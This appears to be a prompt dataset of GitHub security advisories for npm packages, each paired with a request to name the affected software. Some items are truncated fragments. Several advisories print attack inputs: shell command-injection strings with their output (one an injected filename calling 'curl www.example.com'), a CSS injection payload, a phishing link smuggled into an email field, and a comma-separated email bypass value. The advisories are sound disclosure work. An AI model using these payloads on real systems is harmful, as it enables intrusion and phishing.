`PBES2-HS512+A256KW`\n\ne.g.\n\n```js\nconst secret = new Uint8Array(16)\nconst jwe = '...' // JWE from an untrusted party\n\nawait jose.compactDecrypt(jwe, secret)\n```\n\nYou are NOT affected if any of the following applies to you\n\n- Your code does not use the JWE APIs\n- Your code only produces JWE tokens\n- Your code only decrypts JWEs using an asymmetric JWE Key Management Algorithm (this means you're providing an asymmetric key object to the JWE decryption API)\n- Your code only accepts JWEs produced by trusted sources\n- Your code limits the accepted JWE Key Management Algorithms using the `keyManagementAlgorithms` decryption option not including any of the PBKDF2-based JWE key management algorithms\n\n### Patches\n\n`v1.28.2`, `v2.0.6`, `v3.20.4`, and `v4.9.2` releases limit the maximum PBKDF2 iteration count to `10000` by default. It is possible to adjust this limit with a newly introduced `maxPBES2Count` decryption option.\n\n### Workarounds\n\nAll users should be able to upgrade given all stable semver major release lines have had new a patch release introduced which limits the PBKDF2 iteration count to `10000` by default. This removes the ability to craft JWEs that would consume unreasonable amount of CPU time.\n\nIf users are unable to upgrade their required library version they have two options depending on whether they expect to receive JWEs using any of the three PBKDF2-based JWE key management algorithms.\n\n- they can use the `keyManagementAlgorithms` decryption option to disable accepting PBKDF2 altogether\n- they can inspect the JOSE Header prior to using the decryption API and limit the PBKDF2 iteration count (`p2c` Header Parameter)\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an discussion in the project's [repository](https://github.com/panva/jose/discussions/new?category=q-a&title=GHSA-jv3g-j58f-9mq9%20advisory%20question)\n* Email me at [panva.ip@gmail.com](mailto:panva.ip@gmail.com)\n.

Input: ### Impact\nIn Apollo Server 3 and 4, the `cache-control` HTTP response header may not reflect the cache policy that should apply to an HTTP request when that HTTP request contains multiple operations using HTTP batching. This could lead to data being inappropriately cached and shared.\n\nApollo Server allows clients to send multiple operations in a single HTTP request.  The results of these operations are returned in a single HTTP response, with a single set of headers.  Apollo Client Web and Apollo Kotlin both have opt-in features to use batched requests.\n\nApollo Server has several features relating to caching. This advisory is about the ability to set the `cache-control` response header based on field- and operation-specific cache hints. (It is not about the \"response cache plugin\".) This header can be interpreted by a reverse proxy such as a CDN in front of your server, or by a browser.\n\nIn Apollo Server 2, plugins such as the cache control plugin could not control the HTTP headers of responses to batch requests. This meant that batch requests never got the `cache-control` response header.\n\nIn Apollo Server 3 and 4, plugins can set HTTP response headers. But for batched requests, plugins essentially assemble a separate set of response headers in parallel for each operation, and then the header sets are merged together. If plugins set the same header on multiple operations, one value is chosen arbitrarily.\n\nThis meant that if a client sent a batched HTTP request with two operations with different cache policies, Apollo Server 3 and 4 would return a `cache-control` header that only applies to one of the operations. If one operation is allowed to be cached and the other operation is not allowed to be cached, the full response including both results could still end up being cached in a CDN or other reverse proxy cache.\n\nNote that valid batched requests must be POST requests. (There's no defined format for sending batched requests over GET.) So in order for this incorrect `cache-control` header to have a harmful effect, a cache must allow caching POST requests. This means this bug is unlikely to cause incorrect caching in browser or mobile client caches, or in many reverse proxy/CDN caches.\n\nThis issue could lead to cache poisoning attacks. For example, if a client app regularly sends an operation that should not be cached due to its dependency on session-specific information in the same HTTP request as an operation that can be cached in a shared cache, an attacker could send its own version of the request to the server and manage to get the response to its request stored in the shared cache; other users would then see the response specific to the attacker for the first operation rather than the response for their own session. That said, we expect that in a system where this cache poisoning attack is feasible, normal operation would also run into the issue and users may have already disabled one of the features in order for their system to function properly.\n\n### Patches\n\nThis issue is patched in Apollo Server v3.11.0 and v4.1.0. The issue resolved differently in the two versions.\n\nIf you are using Apollo Server 3, upgrade the package you depend on (eg `apollo-server` or `apollo-server-express`) to v3.11.0. This will restore the Apollo Server 2 behavior where the cache control plugin *never* sets the `cache-control` HTTP response header on batched requests. (Other cache-related features, like the response cache plugin, still function.)\n\nIf you are using Apollo Server 4, upgrade `@apollo/server` to v4.1.0. This upgrade makes the response HTTP header object seen by plugins shared among all plugins processing *all operations* on a request, and makes the cache control plugin merge `cache-control` header values across operations in a request. (Note that if you set the `cache-control` response header in your own plugin, Apollo Server v4.1.0's cache control plugin will not try to overwrite the value you set.)\n\n\n### Workarounds\nAs a workaround, you can disable either the HTTP batching feature or the `cache-control` header feature.\n\nTo disable HTTP batching in Apollo Server 3 (v3.5.0 or newer), pass `allowBatchedHttpRequests: false` to `new ApolloServer`.This is the default behavior for Apollo Server 4; in AS4, just make sure you're not passing `allowBatchedHttpRequests: true`. (You cannot disable batching in versions of Apollo Server 3 older than v3.5.0.)\n\nTo disable the `cache-control` header feature, add `ApolloServerPluginCacheControl({ calculateHttpHeaders: false })` to the `plugins` list in `new ApolloServer()`.\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an issue in [the `apollo-server` repository](https://github.com/apollographql/apollo-server)\n* Email us at [security@apollographql.com](mailto:security@apollographql.com)\n.

Input: ### Impact\n`@keystone-6/core@3.0.0 || 3.0.1` users that use `NODE_ENV` in their own code (**not dependencies**) to trigger security-sensitive functionality in a production build are vulnerable to `NODE_ENV` being inlined to `\"development\"` for user code.\n\nIf your dependencies use `NODE_ENV` to trigger particular behaviours (optimisations, security or otherwise), they should still respect your environment's configured `NODE_ENV` variable and thereby be unaffected.\n\nIf you do not use `NODE_ENV` in your own code to trigger security-sensitive functionality, **you are not impacted** by this vulnerability.\nAn example of code that would be affected, might be the following:\n\n```typescript\nif (process.env.NODE_ENV !== 'production') {\n  // this code would unintentionally run in your production builds\n}\n```\n\n### Technical Description\nThe problem comes from esbuild defaulting `NODE_ENV` to `\"development\"` when a platform configuration is undefined.\nYou can read about why [`esbuild` has that behaviour in their documentation](https://esbuild.github.io/api/#platform), but the result for Keystone users is that user Typescript was compiled, and had inlined `NODE_ENV` to the constant `\"development\"`. \n\nYour application's dependencies, as found in `node_modules` (including `@keystone-6/core`), are typically not compiled as part of this process, and thus should be unaffected. Therefore any libraries that used `NODE_ENV` to trigger particular behaviours (optimisations, security or otherwise) should still respect your environment's `NODE_ENV`.\nWe have tested this assumption by verifying that `NODE_ENV=production yarn keystone start` still uses secure cookies when using `statelessSessions`.\n\nThereby, the severity of this vulnerability is dependent on what functionality users conditionally triggered, in their own code, depending on the expectation that `NODE_ENV` would be correctly configured in their application.

Assume Vulnerable Configurations`, this security advisory assumes vulnerable configurations and is thus marked as *critical*, but you should evaluate the true security impact for your application to determine a relevant score.\n\n### Patches\nThis vulnerability has been fixed in `@keystone-6/core@3.0.2`, thanks to @mmachatschek in https://github.com/keystonejs/keystone/pull/8031/.\nWe have added regression tests for this vulnerability in https://github.com/keystonejs/keystone/pull/8063.\n\n### Workarounds\nIf you cannot upgrade your `@keystone-6/core` version for any reason, your best alternative is to remove any code that uses `NODE_ENV` in a way that may reasonably impact your application security. \n\n### References\n- https://esbuild.github.io/api/#platform\n- https://github.com/keystonejs/keystone/pull/8031\n- https://github.com/keystonejs/keystone/pull/8063\n\n### For more information\nThanks to [Austin Burdine](https://github.com/acburdine) for reporting this problem as a potential security vulnerability.\n\nIf you have any questions around this security advisory, please don't hesitate to contact us at [security@keystonejs.com](mailto:security@keystonejs.com), or [open an issue on GitHub](https://github.com/keystonejs/keystone/issues/new/choose).\n\nIf you have a security flaw to report for any software in this repository, please see our [SECURITY policy](https://github.com/keystonejs/keystone/blob/main/SECURITY.md)..

Please identify the software name affected by it. Input: # Impact\n\n_What kind of vulnerability is it? Who is impacted?_\n\nThis is an API vulnerability in Redwood's [dbAuth], specifically the dbAuth forgot password feature:\n- only projects with the dbAuth \"forgot password\" feature are affected\n- this vulnerability was introduced in v0.38.0\n\n## User Accounts are Vulnerable to Takeover (Hijacking)\n\nA reset token for any user can be obtained given knowledge of their username or email via the forgot-password API. With the leaked reset token, a malicious user could request to reset a user's password, changing their credentials and gaining access to their account.\n\n## How to Determine if Projects have been Attacked\n\nTo determine if a project has been attacked, we recommend checking logs for suspicious activity; namely, the volume of requests to the forgot-password API using emails that don't exist. Another indication is if users inform you that they can't access their accounts.\n\nIf you have question or concerns, reach out via the \"For More Information\" section below.\n\n# Patch Releases Available\n\n**The problem has been patched on the v3 and v2 release lines.** Users should upgrade to **v3.3.1+**  or **v2.2.5+** respectively.\n\n## Workarounds\n\n_Is there a way for users to fix or remediate the vulnerability without upgrading?_\n\nWe recommend upgrading to the Patch Releases above. If upgrading is not possible, there are several workarounds:\n\n### Manually strip out `resetToken` and `resetTokenExpiresAt` in the `forgotPassword.handler()`\n\nUsers on all release lines can have their `forgotPassword.handler()` function strip out the sensitive fields manually before returning\n\n```js\nhandler: (user) => {\n  // your code to notify/email user of the link to reset their password...\n\n  const = { resetToken, resetTokenExpiresAt, ...rest }\n\n  return rest\n}\n```\n\n### Use `yarn patch` to manually apply the fix\n\nUsers on v3 and v2 can use [`yarn patch`] to apply the fix if they're using yarn v3. See the dbAuth \"forgot-password\" Account Takeover Vulnerability high gist for instructions. \n\n### Disable the forgot password flow entirely v3 only\n\nUsers on v3 can disable the forgot password flow entirely..

Input: ### Impact\n`next-auth` users who are using the `EmailProvider` either in versions before `4.10.3` or `3.29.10` are affected.\n\nIf an attacker could forge a request that sent a comma-separated list of emails (eg.: `attacker@attacker.com,victim@victim.com`) to the sign-in endpoint, NextAuth.js would send emails to both the attacker and the victim's e-mail addresses. The attacker could then login as a newly created user with the email being `attacker@attacker.com,victim@victim.com`. This means that basic authorization like `email.endsWith(\"@victim.com\")` in the `signIn` callback would fail to communicate a threat to the developer and would let the attacker bypass authorization, even with an `@attacker.com` address.\n\n### Patches\nWe patched this vulnerability in `v4.10.3` and `v3.29.10` by normalizing the email value that is sent to the sign-in endpoint before accessing it anywhere else. We also added a `normalizeIdentifier` callback on the `EmailProvider` configuration, where you can further tweak your requirements for what your system considers a valid e-mail address. (E.g.: strict RFC2821 compliance)\n\nTo upgrade, run one of the following:\n```sh\nnpm i next-auth@latest\n```\n```sh\nyarn add next-auth@latest\n```\n```sh\npnpm add next-auth@latest\n```\n\n(This will update to the latest v4 version, but you can change `latest` to `3` if you want to stay on v3. This is not recommended. v3 is unmaintained.)\n\n### Workarounds\nIf for some reason you cannot upgrade, you can normalize the incoming request like the following, using Advanced Initialization:\n```ts\n// pages/api/auth/[...nextauth].ts\n\nfunction normalize(identifier) {\n  // Get the first two elements only,\n  // separated by `@` from user input.\n  let [local, domain] = identifier.toLowerCase().trim().split(\"@\")\n  // The part before \"@\" can contain a \",\"\n  // but we remove it on the domain part\n  domain = domain.split(\",\")[0]\n  return `${local}@${domain}`\n}\n\nexport default async function handler(req, res) {\n  if (req.body.email) req.body.email = normalize(req.body.email)\n  return await NextAuth(req, res, {/* your options */ })\n}\n```\n\n### References\n- EmailProvider: https://next-auth.js.org/providers/email\n- Normalize the email address: https://next-auth.js.org/providers/email#normalizing-the-email-address\n- Email syntax: https://en.wikipedia.org/wiki/Email_address#Local-part\n- `signIn` callback: https://next-auth.js.org/configuration/callbacks#sign-in-callback\n- Advanced Initialization: https://next-auth.js.org/configuration/initialization#advanced-initialization\n- `nodemailer` address: https://nodemailer.com/message/addresses\n\n### For more information\n\nIf you have any concerns, we request responsible disclosure, outlined here: https://next-auth.js.org/security#reporting-a-vulnerability\n\n### Timeline\n\nThe issue was reported 26th of July, a response was sent out in less than 1 hour and after identifying the issue a patch was published within 5 working days.\n\n### Acknowledgments\n\nWe would like to thank [Socket](https://socket.dev) for disclosing this vulnerability in a responsible manner and following up until it got published..

Please identify the software name affected by it. Input: ### Impact\nOur library allows strings to be parsed as functions and stored as a specialized component, [`JsonFunctionValue`](https://github.com/oxyno-zeta/react-editable-json-tree/blob/09a0ca97835b0834ad054563e2fddc6f22bc5d8c/src/components/JsonFunctionValue.js). To do this, Javascript's [`eval`](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/eval) function was used to execute strings that begin with \"function\" as Javascript. This was an oversight that unfortunately allows arbitrary code to be executed if it exists as a value within the JSON structure being displayed. Given that this component may often be used to display data from arbitrary, untrusted sources, this is extremely dangerous.\n\nOne important note is that users who have defined a custom [`onSubmitValueParser`](https://github.com/oxyno-zeta/react-editable-json-tree/tree/09a0ca97835b0834ad054563e2fddc6f22bc5d8c#onsubmitvalueparser) callback prop on the [`JsonTree`](https://github.com/oxyno-zeta/react-editable-json-tree/blob/09a0ca97835b0834ad054563e2fddc6f22bc5d8c/src/JsonTree.js) component should be ***unaffected***. This vulnerability exists in the default `onSubmitValueParser` prop which calls [`parse`](https://github.com/oxyno-zeta/react-editable-json-tree/blob/master/src/utils/parse.js#L30).\n\n### Patches\nWe have decided on a two-pronged approach to patching this vulnerability:\n\n1. Create a patch update that adds a workaround **which is not enabled by default** to preserve backwards-compatibility\n2. On the next major update, **we will enable this workaround by default**\n\nThe workaround we have decided on is adding a prop to `JsonTree` called `allowFunctionEvaluation`. This prop will be set to `true` in v2.2.2, so you can upgrade without fear of losing backwards-compatibility.\n\nWe have also implemented additional security measures as we know many people may not read the details of this vulnerability, and we want to do the best we can to keep you protected. In v2.2.2, we switched from using `eval` to using [`Function`](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Function) to construct anonymous functions. This is better than `eval` for the following reasons:\n\n- Arbitrary code should not be able to execute immediately, since the `Function` constructor explicitly *only creates* anonymous functions\n- Functions are created without local closures, so they only have access to the global scope\n\nThis change has brought a *slight* potential for breaking backwards-compatibility if users for some reason were relying on side-effects of our usage of `eval`, but that is beyond intended behavior, so we have decided to go ahead with this change and consider it a non-breaking change.\n\n### Workarounds\nAs mentioned above, there are a few scenarios you must consider:\n\nIf you use:\n- **Version `<2.2.2`**, you must upgrade as soon as possible.\n- **Version `^2.2.2`**, you must explicitly set `JsonTree`'s `allowFunctionEvaluation` prop to `false` to fully mitigate this vulnerability.\n- **Version `>=3.0.0`**, `allowFunctionEvaluation` is already set to `false` by default, so no further steps are necessary.\n\n### References\nNone.\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an issue in the [GitHub repo](https://github.com/oxyno-zeta/react-editable-json-tree)\n.

Download data from iana.org/time-zones.', function (version) {\n8          version = version || 'latest';\n\n10          var done  = this.async(),\n11              src   = 'ftp://ftp.iana.org/tz/tzdata-latest.tar.gz',\n12              curl  = path.resolve('temp/curl', version, 'data.tar.gz'),\n13              dest  = path.resolve('temp/download', version);\n...\n24          exec('curl ' + src + ' -o ' + curl + ' && cd ' + dest + ' && gzip -dc ' + curl + ' | tar -xf -', function (err) {\n```\n\nOrdinarily, one one run this script using something like `grunt data-download:2014d`, in which case version would have the value `2014d`. However, if an attacker were to provide additional content on the command line, they would be able to execute arbitrary code\n\n```\nroot@e94ba0490b65:/usr/src/app/moment-timezone# grunt 'data-download:2014d ; echo flag>/tmp/foo #'\n\\Running \"data-download:2014d ; echo flag>/tmp/foo #\" (data-download) task\n>> Downloading https://data.iana.org/time-zones/releases/tzdata2014d ; echo flag>/tmp/foo #.tar.gz\n>> Downloaded https://data.iana.org/time-zones/releases/tzdata2014d ; echo flag>/tmp/foo #.tar.gz\n\nDone.\nroot@e94ba0490b65:/usr/src/app/moment-timezone# cat /tmp/foo\nflag\n```\n\n#### Command Injection via data-zdump.js\n\nThe `tasks/data-zdump.js` script reads a list of files present in a temporary directory (created by previous tasks), and for each one, assembles and executes a command line without sanitization. As a result, an attacker able to influence the contents of that directory could gain code execution. This attack is exacerbated by timezone data being downloaded via cleartext FTP (described above), but beyond that, an attacker at iana.org able to modify the timezone files could disrupt any systems that build moment-timezone.\n\n```\n15              files     = grunt.file.expand({ filter : 'isFile', cwd : 'temp/zic/' + version }, '**/*');\n...\n27          function next () {\n...\n33              var file = files.pop(),\n34                  src  = path.join(zicBase, file),\n35                  dest = path.join(zdumpBase, file);\n36              exec('zdump -v ' + src, { maxBuffer: 20*1024*1024 }, function (err, stdout) {\n```\n\nIn this case, an attacker able to add a file to `temp/zic/2014d` (for example) with a filename like `Z; curl www.example.com` would influence the called to exec on line 36 and run arbitrary code. There are a few minor challenges in exploiting this, since the string needs to be a valid filename.\n\n#### Command Injection via data-zic.js\n\nSimilar to the vulnerability in /tasks/data-download.js, the /tasks/data-zic.js script takes a version from the command line and uses it as part of a command line, executed without sanitization.\n\n```\n10          var done  = this.async(),\n11              dest  = path.resolve('temp/zic', version),\n...\n22              var file = files.shift(),\n23                  src = path.resolve('temp/download', version, file);\n24\n25              exec('zic -d ' + dest + ' ' + src, function (err) {\n```\n\nAs a result, an attacker able to influence that string can run arbitrary commands. Of course, it requires an attacker able to influence the command passed to grunt, so may be unlikely in practice.\n\n```\nroot@e94ba0490b65:/usr/src/app/moment-timezone# grunt 'data-zic:2014d; echo hi > /tmp/evil; echo '\nRunning \"data-zic:2014d; echo hi > /tmp/evil; echo \" (data-zic) task\nexec: zid -d /usr/src/app/moment-timezone/temp/zic/2014d; echo hi > /tmp/evil; echo  /usr/src/app/moment-timezone/temp/download/2014d; echo hi > /tmp/evil; echo /africa\n...\n\nroot@e94ba0490b65:/usr/src/app/moment-timezone# cat /tmp/evil\nhi\n```\n\n### Patches\n\nThe supplied patch on top of 0.5.34 is applicable with minor tweaks to all affected versions. It switches `exec` to `execFile` so arbitrary bash fragments won't be executed any more.\n\n### References\n\n* https://knowledge-base.secureflag.com/vulnerabilities/code_injection/os_command_injection_nodejs.html\n* https://auth0.com/blog/preventing-command-injection-attacks-in-node-js-apps/.

Input: ### Impact\nAn information disclosure vulnerability in `next-auth` before `v4.10.2` and `v3.29.9` allows an attacker with log access privilege to obtain excessive information such as an identity provider's secret in the log (which is thrown during OAuth error handling) and use it to leverage further attacks on the system, like impersonating the client to ask for extensive permissions.\n\n### Patches\nWe patched this vulnerability in `v4.10.2` and `v3.29.9` by moving the log for `provider` information to the debug level. In addition, we added a warning for having the `debug: true` option turned on in production and documented it [here](https://next-auth.js.org/warnings#debug_enabled).\n> You have enabled the debug option. It is meant for development only, to help you catch issues in your authentication flow and you should consider removing this option when deploying to production. One way of only allowing debugging while not in production is to set debug: process.env.NODE_ENV !== \"production\", so you can commit this without needing to change the value.\n> \n> If you want to log debug messages during production anyway, we recommend setting the [logger option](https://next-auth.js.org/configuration/options#logger) with proper sanitization of potentially sensitive user information.\n\nTo upgrade:\n\n```sh\nnpm i next-auth@latest\n# or\nyarn add next-auth@latest\n# or\npnpm add next-auth@latest\n```\n(This will update to the latest v4 version, but you can change `latest` to 3 if you want to stay on v3. This is not recommended. v3 is unmaintained.)\n\n### Workarounds\n\nIf for some reason you cannot upgrade, you can user the `logger` configuration option by sanitizing the logs:\n```ts\n// Example\nimport log from \"your-logging-service\"\nexport const authOptions: NextAuthOptions = {\n  debug: process.env.NODE_ENV !== \"production\",\n  logger: {\n    error: (code, metadata) => {\n      if (!(metadata instanceof Error) &&  metadata.provider) {\n        // redact the provider secret here\n        delete metadata.provider\n        log.error(code, metadata)\n      } else {\n        log.error(code, metadata)\n      }\n    }\n  },\n}\n```\n\n### References\nRelated documentation:\n- https://next-auth.js.org/warnings#debug_enabled\n- https://next-auth.js.org/configuration/options#logger \n- https://next-auth.js.org/getting-started/upgrade-v4\n\n### For more information\nIf you have any concerns, we request responsible disclosure, outlined here: https://next-auth.js.org/security#reporting-a-vulnerability\n\n### Timeline\nThe issue was reported 18th of July, a response was sent out in less than 20 minutes and after identifying the issue a patch was published within a week..

Please identify the software name affected by it. Input: ### Impact\n\nThe functions `ECDSA.recover` and `ECDSA.tryRecover` are vulnerable to a kind of signature malleability due to accepting EIP-2098 compact signatures in addition to the traditional 65 byte signature format. This is only an issue for the functions that take a single `bytes` argument, and not the functions that take `r, v, s` or `r, vs` as separate arguments.\n\nThe potentially affected contracts are those that implement signature reuse or replay protection by marking the signature itself as used rather than the signed message or a nonce included in it. A user may take a signature that has already been submitted, submit it again in a different form, and bypass this protection.\n\n### Patches\n\nThe issue has been patched in 4.7.3.\n\n\n### For more information\n\nIf you have any questions or comments about this advisory, or need assistance deploying a fix, email us at [security@openzeppelin.com](mailto:security@openzeppelin.com).\n.

Input: ### In Brief\n`utils.generateUUID`, a helper function available in essentially all versions of NodeBB (as far back as v1.0.1 and potentially earlier) used a cryptographically insecure Pseudo-random number generator (`Math.random()`), which meant that a specially crafted script combined with multiple invocations of the password reset functionality could enable an attacker to correctly calculate the reset code for an account they do not have access to.\n\n### Impact\nThis vulnerability impacts all installations of NodeBB. The vulnerability allows for an attacker to take over any account without the involvement of the victim, and as such, the remediation should be applied immediately (either via NodeBB upgrade or cherry-pick of the specific changeset. Patches have been provided for both active branches of NodeBB (v2.x and v1.19.x)\u2014please see below.\n\nIf you are already on v2.0.0 or v1.19.7, you can upgrade with no ill effects. The new version contains only the patch for this vulnerability.\n\nThe impact of this vulnerability is slightly lessened by the requirement that the target's email address must be known, **and** user emails are protected values in NodeBB. However, since NodeBB can be configured to display email addresses if the admin so wishes, and as email addresses can often by derived from other sources and/or guessed, the impact of this vulnerability is still fairly high.\n\n### Patches\n\n#### v2.x\nThe vulnerability has been patched in https://github.com/NodeBB/NodeBB/commit/e802fab87f94a13f397f04cfe6068f2f7ddf7888. You can cherry-pick this directly into your codebase.\n\n#### v1.19.x\nThe vulnerability has been patched in 81e3c1ba488d03371a5ce8d0ebb5c5803026e0f9. You can cherry-pick this directly into your codebase.\n\n### Workarounds\nThere is no known workaround, but the patch sets listed above will fully patch the vulnerability.\n\n### References\n* [CWE-338: Use of Cryptographically Weak Pseudo-Random Number Generator (PRNG)](http://cwe.mitre.org/data/definitions/338.html)\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Discuss it on [our community forum](community.nodebb.org/)\n* Email us at [support@nodebb.org](mailto:support@nodebb.org)\n.

In the following snippet we can see that `getStyles` does not sanitize any of the theme variables leaving the door open for `CSS` injection.\n\n_Snippet from [src/styles.js](https://github.com/mermaid-js/mermaid/blob/9eae97ddab1b6eca58d2fd4af62357d2f4d8d1f7/src/styles.js#L35):_\n\n```js\nconst getStyles = (type, userStyles, options) => {\n  return ` {\n    font-family: ${options.fontFamily};\n    font-size: ${options.fontSize};\n    fill: ${options.textColor}\n  }\n```\n\nFor example, if we set `textColor` to `\"green;} #target { background-color: crimson }\"` the resulting `CSS` will contain a new selector `#target` that will apply a `crimson` background color to an arbitrary element.\n\n```html\n<html>\n\n<body>\n    <div id=\"target\">\n        <h1>This element does not belong to the SVG but we can style it</h1>\n    </div>\n    <svg id=\"diagram\">\n    </svg>\n\n    <script src=\"https://cdn.jsdelivr.net/npm/mermaid/dist/mermaid.min.js\"></script>\n    <script>\n        mermaid.initialize({ startOnLoad: false });\n\n        const graph =\n            `\n            %%{ init: { \"themeVariables\" : { \"textColor\": \"green;} #target { background-color: crimson }\" } } }%%\n            graph TD\n                A[Goose]\n            `\n\n        const diagram = document.getElementById(\"diagram\")\n        const svg = mermaid.render('diagram-svg', graph)\n        diagram.innerHTML = svg\n    </script>\n</body>\n\n</html>\n```\n\nIn the proof of concept above we used the `textColor` variable to inject `CSS`, but there are multiple functions that can potentially be abused to change the style of the document. Some of them are in the following list but we encourage mantainers to look for additional injection points:\n\n- https://github.com/mermaid-js/mermaid/blob/5d30d465354f804e361d7a041ec46da6bb5d583b/src/mermaidAPI.js#L393\n- https://github.com/mermaid-js/mermaid/blob/5d30d465354f804e361d7a041ec46da6bb5d583b/src/styles.js#L35\n\n#### Impact\n\nThis issue may lead to `Information Disclosure` via CSS selectors and functions able to generate HTTP requests. This also allows an attacker to change the document in ways which may lead a user to perform unintended actions, such as clicking on a link, etc.\n\n#### Remediation\n\nEnsure that user input is adequately escaped before embedding it in CSS blocks..

Invoke shell-specific behaviour through shell-specific special characters inserted directly after whitespace.\n   - Affected shells: _Bash_, _Dash_, _Zsh_, _PowerShell_\n2. Invoke shell-specific behaviour through shell-specific special characters inserted or appearing after line terminating characters. \n   - Affected shells: _Bash_\n3.

No further changes are required.\n\nBehaviour number 2, 3, and 4 have been patched in [v1.5.8] which you can upgrade to now. No further changes are required.\n\n### Workarounds\n\nThe best workaround is to avoid having to use the `interpolation: true` option - in most cases using an alternative is possible, see [the recipes](https://github.com/ericcornelissen/shescape#recipes) for recommendations.\n\nAlternatively, you can strip all whitespace from user input. Note that this is error prone, for example: for PowerShell this requires stripping `'\\u0085'` which is not included in JavaScript's definition of `\\s` for Regular Expressions.\n\n### References\n\n- https://github.com/ericcornelissen/shescape/pull/322\n- https://github.com/ericcornelissen/shescape/pull/324\n- https://github.com/ericcornelissen/shescape/pull/332\n- https://github.com/ericcornelissen/shescape/releases/tag/v1.5.7\n- https://github.com/ericcornelissen/shescape/releases/tag/v1.5.8\n\n### For more information\n\n- Comment on:\n  - For behaviour 1 (PowerShell): https://github.com/ericcornelissen/shescape/pull/322\n  - For behaviour 1 (Bash, Dash, Zsh): https://github.com/ericcornelissen/shescape/pull/324\n  - For behaviour 2, 3, 4 (_any shell_): https://github.com/ericcornelissen/shescape/pull/332\n- Open an issue at https://github.com/ericcornelissen/shescape/issues (_New issue_ > _Question_ > _Get started_)\n- If you're missing CMD from this advisory, see https://github.com/ericcornelissen/shescape/security/advisories/GHSA-jjc5-fp7p-6f8w\n\n[v1.5.7]: https://github.com/ericcornelissen/shescape/releases/tag/v1.5.7\n[v1.5.8]: https://github.com/ericcornelissen/shescape/releases/tag/v1.5.8\n\n.

Input: ### Impact\n\nAn attacker can pass a compromised input to the e-mail [signin endpoint](https://next-auth.js.org/getting-started/rest-api#post-apiauthsigninprovider) that contains some malicious HTML, tricking the e-mail server to send it to the user, so they can perform a phishing attack. Eg.: `balazs@email.com, <a href=\"http://attacker.com\">Before signing in, claim your money!</a>`. This was previously sent to `balazs@email.com`, and the content of the email containing a link to the attacker's site was rendered in the HTML. This has been remedied in the following releases, by simply not rendering that e-mail in the HTML, since it should be obvious to the receiver what e-mail they used:\n\nnext-auth v3 users before version 3.29.8 are impacted. (We recommend upgrading to v4, as v3 is considered unmaintained. See our [migration guide](https://next-auth.js.org/getting-started/upgrade-v4))\n\nnext-auth v4 users before version 4.8.0 are impacted.\n\n### Patches\n\nWe've released patches for this vulnerability in:\n  \n- v3 - `3.29.8`\n- v4 - `4.9.0`\n\nYou can do:\n\n```sh\nnpm i next-auth@latest\n# or\nyarn add next-auth@latest\n#\npnpm add next-auth@latest\n```\n\n(This will update to the latest v4 version, but you can change  `latest` to `3` if you want to stay on v3. This is not recommended.)\n\n### Workarounds\n\nIf for some reason you cannot upgrade, the workaround requires you to sanitize the `email` parameter that is passed to `sendVerificationRequest` and rendered in the HTML. If you haven't created a custom `sendVerificationRequest`, you only need to upgrade. Otherwise, make sure to either exclude `email` from the HTML body or efficiently sanitize it.

Run `npm publish --dry-run` or `npm pack` with an `npm` version `>=7.9.0` & `<8.11.0` inside the project's root directory using a workspace flag like: `--workspaces` or `--workspace=<name>` (ex. `npm pack --workspace=foo`)\n2. Check the output in your terminal which will list the package contents (note: `tar -tvf <package-on-disk>` also works)\n3. If you find that there are files included you did not expect, you should:\n  3.1. Create & publish a new release excluding those files (ref. [\"Keeping files out of your Package\"](https://docs.npmjs.com/cli/v8/using-npm/developers#keeping-files-out-of-your-package))\n  3.2. Deprecate the old package (ex. `npm deprecate <pkg>[@<version>] <message>`)\n  3.3. Revoke or rotate any sensitive information (ex. passwords, tokens, secrets etc.) which might have been exposed\n### References\n- [CVE-2022-29244](https://nvd.nist.gov/vuln/detail/CVE-2022-29244)\n- [`npm-packlist`](https://github.com/npm/npm-packlist)\n- [`libnpmpack`](https://github.com/npm/cli/tree/latest/workspaces/libnpmpack)\n- [`libnpmpublish`](https://github.com/npm/cli/tree/latest/workspaces/libnpmpublish).

Input: ### Description\n\n`Undici.ProxyAgent` never verifies the remote server's certificate, and always exposes all request & response data to the proxy. This unexpectedly means that proxies can MitM all HTTPS traffic, and if the proxy's URL is HTTP then it also means that nominally HTTPS requests are actually sent via plain-text HTTP between Undici and the proxy server.\n\n### Impact\n\nThis affects all use of HTTPS via HTTP proxy using **`Undici.ProxyAgent`**  with Undici or Node's global `fetch`. In this case, it removes all HTTPS security from all requests sent using Undici's `ProxyAgent`, allowing trivial MitM attacks by anybody on the network path between the client and the target server (local network users, your ISP, the proxy, the target server's ISP, etc).\nThis less seriously affects HTTPS via HTTPS proxies. When you send HTTPS via a proxy to a remote server, the proxy can freely view or modify all HTTPS traffic unexpectedly (but only the proxy). \n\n### Patches\n\nThis issue was patched in Undici v5.5.1.\n\n### Workarounds\n\nAt the time of writing, the only workaround is to not use `ProxyAgent` as a dispatcher for TLS Connections..

Input: ### Impact\n\nAn attacker can send a request to an app using NextAuth.js with an invalid `callbackUrl` query parameter, which internally we convert to a `URL` object. The URL instantiation would fail due to a malformed URL being passed into the constructor, causing it to throw an unhandled error which led to our **API route handler timing out and logging in to fail**. This has been remedied in the following releases:\n\nnext-auth v3 users before version 3.29.5 are impacted. (We recommend upgrading to v4, as v3 is considered unmaintained. See our [migration guide](https://next-auth.js.org/getting-started/upgrade-v4))\n\nnext-auth v4 users before version 4.5.0 are impacted.\n\n### Patches\n\nWe've released patches for this vulnerability in:\n  \n- v3 - `3.29.5`\n- v4 - `4.5.0`\n\nYou can do:\n\n```sh\nnpm i next-auth@latest\n```\n\nor\n\n```sh\nyarn add next-auth@latest\n```\n\nor\n\n```sh\npnpm add next-auth@latest\n```\n\n(This will update to the latest v4 version, but you can change  `latest` to `3` if you want to stay on v3. This is not recommended.)\n\n### Workarounds\n\nIf for some reason you cannot upgrade, the workaround requires you to rely on [Advanced Initialization](https://next-auth.js.org/configuration/initialization#advanced-initialization). Here is an example:\n\n**Before:**\n\n```js\n// pages/api/auth/[...nextauth].js\nimport NextAuth from \"next-auth\"\n\nexport default NextAuth(/* your config */)\n```\n\n**After:**\n\n```js\n// pages/api/auth/[...nextauth].js\nimport NextAuth from \"next-auth\"\n\nfunction isValidHttpUrl(url) {\n  try {\n    return /^https?:/.test(url).protocol\n  } catch {\n    return false;\n  